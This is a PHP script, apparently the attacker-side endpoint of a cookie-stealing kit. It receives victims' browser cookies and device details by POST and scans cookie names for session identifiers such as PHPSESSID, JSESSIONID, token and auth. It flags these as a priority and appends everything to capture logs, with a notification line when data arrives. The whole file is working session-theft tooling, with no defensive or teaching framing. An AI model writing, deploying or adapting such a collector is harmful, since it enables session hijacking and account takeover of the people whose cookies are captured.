<?php
// device.php - Enhanced cookie and device info capture with session ID extraction
$date = date('dMYHis');
$file = 'device_info.txt';
$cookieFile = 'cookies_detailed.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $json = json_decode($data, true);
    
    if ($json) {
        // Parse cookies into individual key-value pairs
        $cookieString = $json['cookies'] ?? 'None';
        $cookieArray = [];
        $sessionIds = [];
        
        if ($cookieString !== 'None' && $cookieString !== 'No cookies available') {
            $cookies = explode('; ', $cookieString);
            foreach ($cookies as $cookie) {
                if (strpos($cookie, '=') !== false) {
                    list($name, $value) = explode('=', $cookie, 2);
                    $cookieArray[$name] = $value;
                    
                    // Detect session IDs
                    $sessionPatterns = ['PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId', 'ASPSESSIONID', 
                                       'session', 'sid', 'sess', 'token', 'auth', 'login'];
                    foreach ($sessionPatterns as $pattern) {
                        if (stripos($name, $pattern) !== false) {
                            $sessionIds[$name] = $value;
                        }
                    }
                }
            }
        }
        
        // Create detailed log entry
        $logEntry = "\n" . str_repeat("=", 80) . "\n";
        $logEntry .= "[$date] NEW CAPTURE\n";
        $logEntry .= str_repeat("=", 80) . "\n\n";
        
        // Session IDs (PRIORITY)
        if (!empty($sessionIds)) {
            $logEntry .= "🔑 SESSION IDs DETECTED:\n";
            $logEntry .= str_repeat("-", 80) . "\n";
            foreach ($sessionIds as $name => $value) {
                $logEntry .= sprintf("%-30s : %s\n", $name, $value);
            }
            $logEntry .= "\n";
        }
        
        // All Cookies
        if (!empty($cookieArray)) {
            $logEntry .= "🍪 ALL COOKIES (" . count($cookieArray) . " total):\n";
            $logEntry .= str_repeat("-", 80) . "\n";
            foreach ($cookieArray as $name => $value) {
                $logEntry .= sprintf("%-30s : %s\n", $name, substr($value, 0, 100));
            }
            $logEntry .= "\n";
        } else {
            $logEntry .= "🍪 COOKIES: No cookies found\n\n";
        }
        
        // Device Information
        $logEntry .= "📱 DEVICE INFORMATION:\n";
        $logEntry .= str_repeat("-", 80) . "\n";
        $logEntry .= sprintf("%-30s : %s\n", "User Agent", $json['userAgent'] ?? 'Unknown');
        $logEntry .= sprintf("%-30s : %s\n", "Platform", $json['platform'] ?? 'Unknown');
        $logEntry .= sprintf("%-30s : %s\n", "Screen Resolution", $json['screen'] ?? 'Unknown');
        $logEntry .= sprintf("%-30s : %s\n", "Language", $json['language'] ?? 'Unknown');
        $logEntry .= sprintf("%-30s : %s GB\n", "Memory", $json['memory'] ?? 'Unknown');
        $logEntry .= sprintf("%-30s : %s\n", "CPU Cores", $json['cores'] ?? 'Unknown');
        $logEntry .= sprintf("%-30s : %s\n", "Browser Vendor", $json['vendor'] ?? 'Unknown');
        $logEntry .= sprintf("%-30s : %s\n", "Timestamp", $json['timestamp'] ?? date('Y-m-d H:i:s'));
        $logEntry .= "\n";
        
        // Save to main file
        file_put_contents($file, $logEntry, FILE_APPEND);
        
        // Save detailed cookies to separate file
        if (!empty($cookieArray)) {
            $cookieLog = "\n[$date] COOKIES CAPTURED:\n";
            foreach ($cookieArray as $name => $value) {
                $cookieLog .= "$name=$value\n";
            }
            $cookieLog .= "\n";
            file_put_contents($cookieFile, $cookieLog, FILE_APPEND);
        }
        
        // Trigger notification
        file_put_contents("Log.log", "Device info + Cookies received!\n", FILE_APPEND);
        
        echo json_encode(['status' => 'success', 'cookies_captured' => count($cookieArray)]);
    }
}
?>
